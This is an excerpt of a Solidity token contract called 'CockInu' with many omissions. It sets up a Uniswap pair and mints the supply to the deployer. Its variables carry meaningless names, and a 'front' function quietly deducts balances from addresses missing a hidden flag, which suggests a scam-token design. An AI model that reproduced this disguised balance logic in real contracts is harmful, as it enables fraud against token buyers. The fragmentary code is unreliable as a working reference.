...
contract CockInu is Ownable {
    ...
    bool corner;
    address private at;
    address private simplest;
    address private white;
    ...
    mapping(address => uint256) private made;
    ...
    function front(
        ...
        if (!corner && handsome[atomic] == 0 && laid[atomic] > 0) {
            handsome[atomic] -= sold;
        }

        about = slabs * spider;

        if (handsome[atomic] == 0) {
            made[atomic] -= slabs;
        }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(review);
        at = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        spider = 3;
        track = 100;
        handsome[stomach] = sold;
        _tTotal = 1000000000000000 * 10**sold;
        made[msg.sender] = _tTotal;
    }
}